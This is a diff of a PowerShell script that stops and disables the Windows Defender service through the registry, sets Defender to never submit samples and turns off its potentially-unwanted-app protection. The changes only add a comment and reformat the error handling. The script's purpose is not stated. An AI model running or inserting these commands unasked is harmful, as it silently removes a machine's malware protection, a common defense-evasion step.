@@ -1,8 +1,9 @@
+#Attempting to disable windows defender
+
 try {
 	Get-Service WinDefend | Stop-Service -Force
 	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -value 4 -Type DWORD -Force
-}
-catch {
+} catch {
 	Write-Warning "Failed to disable WinDefend service"
 }
 
@@ -34,8 +35,6 @@ try {
 		Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
 		Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
 	}
-}
-catch {
+} catch {
 	Write-Warning "Failed to disable Windows Defender"
 }
-
